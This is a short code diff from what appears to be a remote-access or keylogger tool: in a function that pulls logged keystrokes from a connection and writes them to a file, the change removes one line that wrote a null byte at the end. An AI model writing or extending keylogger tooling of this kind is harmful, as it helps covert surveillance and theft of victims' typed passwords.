@@ -105,8 +105,6 @@ int command_Keylogger_Get(char* msg, int len)
 	{
 		if(rmsg[0] == COMMAND_KEYLOGGER_GET_END)
 		{
-			fwrite("\0", 1, 1, f);
-
 			break;
 		}else if(rmsg[0] == COMMAND_KEYLOGGER_GET_DATA){
 			fwrite(rmsg + 1, 1, rv - 1, f); //- 1 cuz CMD
